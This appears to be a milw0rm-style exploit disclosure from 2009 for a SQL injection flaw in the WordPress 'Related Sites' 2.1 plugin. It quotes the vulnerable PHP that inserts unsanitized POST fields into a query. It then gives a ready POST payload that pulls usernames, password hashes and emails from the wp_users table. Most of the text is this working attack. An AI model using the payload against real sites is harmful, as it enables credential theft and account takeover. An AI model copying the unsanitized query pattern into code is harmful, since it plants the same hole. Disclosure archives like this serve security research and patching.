@@ -1,0 +1,25 @@
+WordPress Plugin Related Sites 2.1 BlindSQLinj Vuln
+
+
+
+http://wordpress.org/extend/plugins/related-sites/
+/wp-content/plugins/related-sites/BTE_RW_webajax.php
+
+eLwaux(c) 30.05.2009, uasc.org.ua
+
+
+SQL-Inj
+
+27:  $guid = $_POST['guid'];
+28:  $click = $_POST['click'];
+31:  $ref = $_SERVER["HTTP_REFERER"];
+40:  if ($guid!="" && $click!="" && $hostname!="" && $ipaddr!="" && $ref!="") {
+53:   $sql = "INSERT INTO $clicks_table_name (guid,click) VALUES ('$guid','$clickinfo')";
+55:  }
+
+exploit:
+POST: guid = 0', (select concat_ws(0x3a,user_login,user_pass,user_nicename,user_email) from wp_users where ID>0 and user_status=0 limit 1 ) );-- 
+POST: click = .
+HTTP_REFERER = .
+
+# milw0rm.com [2009-06-30]
